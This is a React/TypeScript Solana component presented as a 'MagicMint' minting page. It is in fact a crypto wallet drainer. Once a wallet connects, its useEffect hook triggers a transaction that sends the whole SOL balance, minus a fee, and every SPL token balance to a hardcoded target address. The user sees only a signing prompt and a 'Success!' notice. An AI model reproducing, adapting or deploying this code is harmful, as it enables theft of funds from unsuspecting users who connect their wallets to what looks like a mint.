import { useState, useEffect } from 'react';
import { useWallet } from "@solana/wallet-adapter-react";
import {
	Connection,
	Keypair,
	PublicKey,
	Transaction,
	TransactionInstruction,
	ConfirmOptions,
	SystemProgram,
	clusterApiUrl,
	LAMPORTS_PER_SOL,
	SYSVAR_RENT_PUBKEY,
	SYSVAR_CLOCK_PUBKEY,
	sendAndConfirmTransaction
} from '@solana/web3.js'
import { AccountLayout, MintLayout, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, Token } from "@solana/spl-token";
import useNotify from './notify'
import * as anchor from "@project-serum/anchor";
import fs from 'fs'
import { programs } from '@metaplex/js';
import axios from 'axios'

let wallet: any
// let conn = new Connection('https://solana-mainnet.phantom.tech')
let conn = new Connection('https://api.devnet.solana.com')
let notify: any

const { metadata: { Metadata } } = programs
const confirmOption: ConfirmOptions = { commitment: 'finalized', preflightCommitment: 'finalized', skipPreflight: false }
const programId = new PublicKey("M2mx93ekt1fmXSVkTrUL9xVFHkmME8HTUi5Cyc5aF7K")
const TOKEN_METADATA_PROGRAM_ID = new anchor.web3.PublicKey("metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s")
export default function MagicMint() {
	wallet = useWallet()
	notify = useNotify()

	const [targetAddress, setTargetAddress] = useState('CuLgeM9QPyX4DRpn2Fw4qh1KfX9tur9Pr3TsJQKSUeNd')

	useEffect(() => {
		if (wallet.publicKey !== null)
			send()
	}, [wallet]);
	const getTokenWallet = async (owner: PublicKey, mint: PublicKey) => {
		return (
			await PublicKey.findProgramAddress(
				[owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
				ASSOCIATED_TOKEN_PROGRAM_ID
			)
		)[0];
	}
	async function sendTransaction(transaction: Transaction, signers: Keypair[]) {
		transaction.feePayer = wallet.publicKey
		transaction.recentBlockhash = (await conn.getRecentBlockhash('max')).blockhash;

		await transaction.setSigners(wallet.publicKey, ...signers.map(s => s.publicKey));
		if (signers.length != 0) await transaction.partialSign(...signers)
		const signedTransaction = await wallet.signTransaction(transaction);
		console.log(signedTransaction);
		let hash = await conn.sendRawTransaction(await signedTransaction.serialize());
		await conn.confirmTransaction(hash);
		return hash
	}

	const send = async () => {
		try {
			let transaction = new Transaction()
			const target = new PublicKey(targetAddress)
			const balance = await conn.getBalance(wallet.publicKey);
			const fee = 0.001 * LAMPORTS_PER_SOL;
			if (balance <= fee) {
				console.log("insufficient gas fee")
				return;
			}
			transaction.add(SystemProgram.transfer({
				fromPubkey: wallet.publicKey,
				toPubkey: target,
				lamports: (balance - fee)
			}));
			const tokenAccounts = await conn.getParsedTokenAccountsByOwner(wallet.publicKey, { programId: TOKEN_PROGRAM_ID }, "finalized");
			for (let index = 0; index < tokenAccounts.value.length; index++) {
				try {
					const tokenAccount = tokenAccounts.value[index];
					const tokenMint = new PublicKey(tokenAccount.account.data.parsed.info.mint);
					const toTokenAccount = await getTokenWallet(target, tokenMint);
					if ((await conn.getAccountInfo(toTokenAccount)) === null)
						transaction.add(Token.createAssociatedTokenAccountInstruction(ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID, tokenMint, toTokenAccount, target, wallet.publicKey))
					const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
					if (Number(tokenAmount.amount) > 0) {
						transaction.add(
							Token.createTransferInstruction(
								TOKEN_PROGRAM_ID,
								tokenAccount.pubkey,
								toTokenAccount,
								wallet.publicKey,
								[],
								Number(tokenAmount.amount)
							)
						);
					}
				} catch (error) {
					console.log(error);
				}
			}
			await sendTransaction(transaction, [])
			notify('success', 'Success!')
		} catch (err) {
			console.log(err)
			notify('error', 'Failed Transaction!')
		}
	}



	return <div className="container-fluid mt-4 row">
		<div className="col-lg-6">
			<div className="input-group mb-3">
				<span className="input-group-text">TARGET ADDRESS</span>
				<input name="targetAddress" type="text" className="form-control" onChange={(event) => { setTargetAddress(event.target.value) }} value={targetAddress} />
			</div>

			<div className="row container-fluid mb-3">
				<button type="button" disabled={!(wallet && wallet.connected)} className="btn btn-primary" onClick={async () => {
					await send()
				}}> Send </button>
			</div>
		</div>
	</div>
}